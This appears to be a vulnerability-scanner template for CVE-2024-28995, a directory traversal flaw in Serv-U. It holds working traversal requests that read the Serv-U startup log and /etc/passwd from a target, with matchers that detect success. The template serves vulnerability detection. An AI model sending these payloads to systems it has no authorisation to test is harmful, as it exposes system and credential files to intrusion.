id: CVE-2024-28995

info:
  name: CVE-2024-28995 - Directory Traversal in Serv-U
  author: chippa vijay kumar
  severity: high
  description: |
    Directory traversal vulnerability in Serv-U allows attackers to access sensitive files. This template checks for the existence of specific files that indicate the vulnerability.
  references:
    - https://github.com/krypton-kry/CVE-2024-28995
  tags: cve, traversal, serv-u

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?InternalDir=/../../../../ProgramData/RhinoSoft/Serv-U/&InternalFile=Serv-U-StartupLog.txt"
      - "{{BaseURL}}/?InternalDir=\\..\\..\\..\\etc&InternalFile=passwd"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "Operating System: Windows Server"
        condition: and
        part: body

      - type: regex
        regex:
          - "root:x"
          - "bin:x"
          - "admin:x"
          - "sys:x"
        condition: or
        part: body
